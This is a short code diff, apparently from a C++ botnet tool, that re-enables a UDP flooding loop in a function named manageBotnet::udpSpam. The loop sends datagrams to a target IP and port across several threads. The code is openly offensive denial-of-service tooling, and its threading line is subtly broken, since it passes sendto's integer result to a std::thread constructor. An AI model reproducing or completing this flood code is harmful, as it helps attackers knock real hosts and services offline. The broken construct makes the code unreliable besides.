@@ -44,14 +44,14 @@ void manageBotnet::udpSpam() {
     addr.sin_port = htons(port_);
     addr.sin_addr.s_addr = inet_addr(ip.c_str());
 
-    //for (int i = 0; i < thread; i++) {
-        //std::thread Thread1(bytesSent = sendto(sock_, buffer, sizeof(buffer) / sizeof(char), 0, (struct sockaddr*)&addr, sizeof(addr)));
-        //Thread1.detach();
-    //}
+    for (int i = 0; i < thread; i++) {
+        std::thread Thread1(bytesSent = sendto(sock_, buffer, sizeof(buffer) / sizeof(char), 0, (struct sockaddr*)&addr, sizeof(addr)));
+        Thread1.detach();
+    }
 
-    //if (bytesSent == -1) {
-      //  errorNotStop("error 234", "bad sendto");
-    //}
+    if (bytesSent == -1) {
+       errorNotStop("error 234", "bad sendto");
+    }
 
     closesocket(sock_);
     WSACleanup();
